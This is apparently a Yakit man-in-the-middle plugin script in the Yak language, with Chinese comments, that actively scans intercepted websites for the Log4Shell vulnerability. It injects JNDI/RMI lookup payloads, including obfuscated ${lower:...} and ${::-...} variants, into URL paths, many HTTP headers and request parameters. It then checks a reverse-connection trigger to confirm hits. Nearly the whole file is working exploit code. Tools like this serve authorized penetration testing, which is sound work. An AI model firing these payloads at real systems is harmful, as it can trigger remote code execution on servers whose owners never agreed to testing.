# mitm plugin template

#-----------------------MITM Hooks I/O-------------------------
/*
#如何使用插件参数？

## 例如，如果你设置了一个参数为 url_keyword 的参数，可以通过 MITM_PARAMS 来使用它！
urlKeyword = MITM_PARAMS["url_keyword"]

# 如何输出给 Yakit 给用户查看？

yakit_output(i: any) // 可以只输出到 "Console 界面"
yakit_save(i: any)   // 可以输出并保存到数据库中，在 "插件输出" 中查看
*/
#----------------MITM Hooks Test And Quick Debug-----------------
/*
# __test__ 是 yakit mitm 插件用于调试的函数 【注意：这个函数在 MITM hooks劫持环境下不会被导入】

在这个函数中，你可以使用 yakit.GenerateYakitMITMHooksParams(method: string, url: string, opts ...http.Option) 来方便的生成可供 hooks 调用的参数，参考代码模版中的用法～

*/


#--------------------------WORKSPACE-----------------------------
__test__ = func() {
    isHttps = false
    // 构建一个测试请求
    rspRaw, reqRaw, err := poc.HTTP(`
GET /hello?payload=a HTTP/1.1
Host: 127.0.0.1:8080


`, poc.https(isHttps))
    die(err)

    // 从响应报文里拿body
    body, _ := str.ExtractBodyFromHTTPResponseRaw(rspRaw)
    // 从请求报文里拿url
    url, _ := str.ExtractURLFromHTTPRequestRaw(reqRaw, isHttps)

    results = [isHttps, url, reqRaw, rspRaw, body]

    // 直接触发hooks
    // mirrorHTTPFlow(results...)
    // mirrorFilteredHTTPFlow(results...)
    mirrorNewWebsite(results...)
    // mirrorNewWebsitePath(results...)
    mirrorNewWebsitePathParams(results...)
}

headers = [
    "X-Client-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "X-Forwarded-For",
    "X-Originating-IP",
    "User-Agent",
    "Referer",
    "CF-Connecting_IP",
    "True-Client-IP",
    "X-Real-IP",
    "Contact",
    "X-Wap-Profile",
    "X-APi-Version",
    "Content-Type",
    // "Accept",
    "Content-Encoding",
]

payloads = [
    "${jndi:rmi://%v/1}",
    // "${jndi:${::-r}mi://%v/1}",
    "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://%v/1}",
    // "${${::-j}ndi:rmi://%v/1}",
    "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:r}${lower:m}${lower:i}://%v/1}",
    // "${${lower:j}ndi: rmi://%v/1}",
]

// 创建一个token，返回host和port和token字符串
getNewToken = func() {
    token, hostPort, err := risk.NewRandomPortTrigger(risk.type("TCP反连"), risk.typeVerbose("RMI反连"), risk.
    title("Log4Shell反连"))
    if err != nil {
        yakit_output(err.Error())
    }
    if token == "" {
        yakit_output("未配置 Yak Bridge 作为公网映射，无法获取随机端口")
        continue
    }
    return token, hostPort
}

httpFlow := 0
hit := 0
// # mirrorHTTPFlow 会镜像所有的流量到这里，包括 .js / .css / .jpg 这类一般会被劫持程序过滤的请求
// mirrorHTTPFlow = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
    
// }

// # mirrorFilteredHTTPFlow 劫持到的流量为 MITM 自动过滤出的可能和 "业务" 有关的流量，会自动过滤掉 js / css 等流量
// mirrorFilteredHTTPFlow = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
    
// }

# mirrorNewWebsite 每新出现一个网站，这个网站的第一个请求，将会在这里被调用！
mirrorNewWebsite = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
    httpFlow += 1
    yakit_status("插件经过的流量数", parseString(httpFlow))
    // 创建一个fuzz请求
    freq, err := fuzz.HTTPRequest(req)
    if err != nil {
        yakit_output("执行失败")
        continue
    }

    // 在PATH中检测
    func() {
        pathFReq := freq
        // 生成token与payload对应的map
        pathPayload := make(map[string]string)
        for _, payload := range payloads {
            // 生成一个token和payload
            token, hostPort := getNewToken()
            pathPayload[token] = sprintf("/%s", sprintf(payload, hostPort))
        }

        // 生成所有payload的请求，共五个。参数置空，GET请求测试
        pathSlice := make([]string)
        for _, path := range pathPayload {
            pathSlice = append(pathSlice, path)
        }

        // pathFReq.FuzzMethod("GET").FuzzPath(pathSlice...).FuzzGetParamsRaw("").Show()
        res, err := pathFReq.FuzzMethod("GET").FuzzPath(pathSlice...).FuzzGetParamsRaw("").Exec(httpool.https(isHttps))
        if err != nil {
            yakit_output("执行失败")
            return
        }

        // res其实是一个channel，转成slice
        // make([]interface{})
        resultList := make([]var)
        for result := range res {
            if result.Error == nil {
                resultList = append(resultList, result)
            }
        }

        // 遍历token，判断是否成功
        for token, payload := range pathPayload {
            detail, err := risk.CheckRandomTriggerByToken(token)
            if err != nil {
                println(err.Error())
                continue
            }
            if risk.HaveReverseRisk(token) {
                if (detail.Timestamp - detail.TriggerTimestamp) < 10 {
                    yakit_output({
                        "message": "发现一个 Log4Shell 漏洞",
                        "url": sprintf("%v://%v/%v", url.Scheme, url.Host, payload[1:]),
                        "payload": payload[1:],
                    })
                    hit += 1
                    yakit_status("命中数量", parseString(hit))
                }
            }

        }
    }()

    // 在Header头中检测
    func() {
        for _, payload := range payloads {
            // 生成token与header对应的map
            headerPayload := make(map[string][]string)

            headerFReq := freq
            for _, header := range headers {
                // 生成token
                token, hostPort := getNewToken()
                // 这里是链式调用
                formatedPayload := sprintf(payload, hostPort)
                headerFReq = headerFReq.FuzzHTTPHeader(header, formatedPayload)
                headerPayload[token] = [header, formatedPayload]
            }
            // headerFReq.Show()
            res, err := headerFReq.Exec(httpool.https(isHttps))
            if err != nil {
                yakit_output("执行失败")
                return
            }

            // res其实是一个channel，转成slice
            // make([]interface{})
            resultList := make([]var)
            for result := range res {
                if result.Error == nil {
                    resultList = append(resultList, result)
                }
            }

            hasVuln := false
            for token, header := range headerPayload {
                detail, err := risk.CheckRandomTriggerByToken(token)
               if risk.HaveReverseRisk(token) {
                   if (detail.Timestamp - detail.TriggerTimestamp) < 10 {
                       yakit_output({
                            "message": "发现一个 Log4Shell 漏洞",
                            "url": sprintf("%v", url),
                            "header": header[0],
                            "payload": header[1],
                            "token": token,
                        })
                        hit += 1
                        yakit_status("命中数量", parseString(hit))

                        hasVuln = true
                        break
                   }
               }
            }
            if hasVuln {
                break
            }
        }
    }()
}

// # mirrorNewWebsitePath 每新出现一个网站路径，关于这个网站路径的第一个请求，将会在这里被传入回调
// mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
    
// }

# mirrorNewWebsitePathParams 每新出现一个网站路径且带有一些参数，参数通过常见位置和参数名去重，去重的第一个 HTTPFlow 在这里被调用
mirrorNewWebsitePathParams = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
    httpFlow += 1
    yakit_status("插件经过的流量数", parseString(httpFlow))

    freq, err := fuzz.HTTPRequest(req, fuzz.https(isHttps))
    if err != nil {
        yakit_output("执行失败")
        continue
    }

    // 遍历所有参数
    for _, param := range freq.GetCommonParams() { 
        paramName := param.Name()
        paramPosition := param.Position()

        for _, payload := range payloads {
            token, hostPort := getNewToken()
            // param.Fuzz(sprintf(payload, hostPort)).Show()
            res, err := param.Fuzz(sprintf(payload, hostPort)).Exec(httpool.https(isHttps))

            detail, err := risk.CheckRandomTriggerByToken(token)
            if risk.HaveReverseRisk(token) {
                if (detail.Timestamp - detail.TriggerTimestamp) < 10 {
                    yakit_output({
                        "message": "发现一个 Log4Shell 漏洞",
                        "url": sprintf("%v", url),
                        "payload": sprintf(payload, hostPort),
                        "param_name": paramName,
                        "param_position": paramPosition,
                        "token": token,
                    })
                    hit += 1
                    yakit_status("命中数量", parseString(hit))
                    break
                }
            }
        }
    }
}
